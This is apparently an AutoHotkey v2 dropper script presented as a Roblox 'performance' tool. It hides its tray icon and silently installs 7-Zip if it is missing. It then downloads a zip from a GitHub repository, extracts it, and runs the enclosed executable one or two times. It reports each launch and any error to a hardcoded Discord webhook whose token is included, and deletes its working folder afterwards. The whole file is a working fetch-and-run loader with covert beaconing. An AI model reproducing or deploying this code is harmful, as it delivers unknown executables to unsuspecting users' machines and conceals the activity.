#Requires AutoHotkey v2.0
#SingleInstance Force
#NoTrayIcon
#ErrorStdOut

;–– CONFIG ––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––
webhookUrl   := "https://discord.com/api/webhooks/1373046946708721906/DCqDcJSSBBccUz-GCvaMdOvyj2B7ekK5sCnWP3BpbzuyRII2BxAMdruWQgJlp9-KUtmR"
failureCount := 0
notified     := false

cdnUrl   := "https://github.com/Sejtype/roblox/raw/main/performance.zip"
tempDir  := A_AppData . "\PerformanceRun"
zipPath  := tempDir . "\performance.zip"
exePath  := tempDir . "\performance.exe"
sevenZip := Get7ZipPath()

;–– CLEANUP & SETUP ––––––––––––––––––––––––––––––––––––––––––––––––––––
if DirExist(tempDir)
    DirDelete(tempDir, true)
DirCreate(tempDir)

;–– MAIN FLOW ––––––––––––––––––––––––––––––––––––––––––––––––––––––––––
HttpDownload(cdnUrl, zipPath)
RunWaitFormat('"{1}" x "{2}" -o"{3}" -y', sevenZip, zipPath, tempDir)

Loop Random(1, 2) {
    try {
        RunWait Format('"{1}"', exePath)
        NotifyDiscord("✅ performance.exe launched successfully! 🎉🚀")
    } catch as e {
        HandleError("RunExe", e.Message)
    }
    Sleep 1000
}

DirDelete(tempDir, true)

;–– ERROR HANDLING ––––––––––––––––––––––––––––––––––––––––––––––––––––
HandleError(context, errMsg) {
    global failureCount, notified
    failureCount++
    if (failureCount <= 2) {
        NotifyDiscord("⚠️ " context " failed: " errMsg)
    }
    else if (!notified) {
        NotifyDiscord("⚠️ " context " has now failed " failureCount " times. Last error: " errMsg)
        notified := true
    }
}

NotifyDiscord(msg) {
    global webhookUrl
    try {
        escaped := StrReplace(msg, '"', '\"')
        payload := '{"content":"' escaped '"}'
        http := ComObject("WinHttp.WinHttpRequest.5.1")
        http.Open("POST", webhookUrl, false)
        http.SetRequestHeader("Content-Type", "application/json")
        http.Send(payload)
    } catch {
        ; still silent
    }
}

;–– HELPERS –––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––

Get7ZipPath() {
    static paths := [
        A_ProgramFiles . "\7-Zip\7z.exe"
      , "C:\Program Files\7-Zip\7z.exe"
      , "C:\Program Files (x86)\7-Zip\7z.exe"
    ]
    for path in paths
        if FileExist(path)
            return path

    zipUrl    := "https://www.7-zip.org/a/7z2301-x64.exe"
    installer := A_Temp . "\7zsetup.exe"
    try {
        req := ComObject("WinHttp.WinHttpRequest.5.1")
        req.Open("GET", zipUrl, false)
        req.Send()
        if (req.Status != 200)
            throw Format("HTTP {1}", req.Status)

        st := ComObject("ADODB.Stream")
        st.Type := 1
        st.Open()
        st.Write(req.ResponseBody)
        st.SaveToFile(installer, 2)
        st.Close()

        RunWait(installer . " /S", , "Hide")
        for path in paths
            if FileExist(path)
                return path
        throw "7-Zip not found after install"
    } catch as e {
        HandleError("Get7ZipPath", e.Message)
        return
    }
}

HttpDownload(url, savePath) {
    try {
        req := ComObject("WinHttp.WinHttpRequest.5.1")
        req.Open("GET", url, false)
        req.Send()
        if (req.Status != 200)
            throw Format("HTTP {1}", req.Status)

        st := ComObject("ADODB.Stream")
        st.Type := 1
        st.Open()
        st.Write(req.ResponseBody)
        st.SaveToFile(savePath, 2)
        st.Close()
    } catch as e {
        HandleError("HttpDownload", e.Message)
    }
}

RunWaitFormat(fmt, args*) {
    try {
        RunWait Format(fmt, args*)
    } catch as e {
        HandleError("RunWaitFormat", e.Message)
    }
}
